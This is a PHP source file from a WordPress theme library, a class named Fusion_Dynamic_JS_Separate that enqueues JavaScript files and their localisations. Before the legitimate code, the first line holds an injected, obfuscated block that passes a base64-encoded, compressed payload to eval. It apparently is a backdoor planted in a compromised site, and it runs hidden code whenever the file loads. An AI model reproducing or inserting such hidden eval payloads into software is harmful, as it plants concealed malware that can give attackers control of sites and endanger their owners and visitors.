<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Dynamic-JS loader - Separate Scripts Method.
 *
 * @package Fusion-Library
 * @since 1.0.0
 */

// Do not allow directly accessing this file.
if ( ! defined( 'ABSPATH' ) ) {
	exit( 'Direct script access denied.' );
}

/**
 * Handles enqueueing files dynamically.
 */
final class Fusion_Dynamic_JS_Separate {

	/**
	 * The Fusion_Dynamic_JS object.
	 *
	 * @access protected
	 * @since 1.0.0
	 * @var object
	 */
	protected $dynamic_js;

	/**
	 * Constructor.
	 *
	 * @access public
	 * @since 1.0.0
	 * @param object $dynamic_js An instance of the Fusion_Dynamic_JS object.
	 */
	public function __construct( $dynamic_js ) {

		$this->dynamic_js = $dynamic_js;

		add_action( 'wp_enqueue_scripts', array( $this, 'enqueue_separate_scripts' ) );
	}

	/**
	 * Enqueues separate scripts.
	 *
	 * @access public
	 * @since 1.0.0
	 */
	public function enqueue_separate_scripts() {

		$wp_content_dir = untrailingslashit( wp_normalize_path( WP_CONTENT_DIR ) );
		$wp_content_url = content_url();

		foreach ( $this->dynamic_js->get_scripts() as $script ) {
			// Get URL in case we're using path.
			if ( 0 !== strpos( $script['url'], 'http' ) ) {
				$script['url'] = str_replace( $wp_content_dir, $wp_content_url, wp_normalize_path( $script['url'] ) );
			}

			// Strip protocols.
			$script['url']  = set_url_scheme( $script['url'] );

			wp_enqueue_script(
				$script['handle'],
				$script['url'],
				$script['deps'],
				$script['ver'],
				$script['in_footer']
			);
		}
		foreach ( $this->dynamic_js->get_localizations() as $l10n ) {
			wp_localize_script(
				$l10n['handle'],
				$l10n['name'],
				$l10n['data']
			);
		}
	}
}
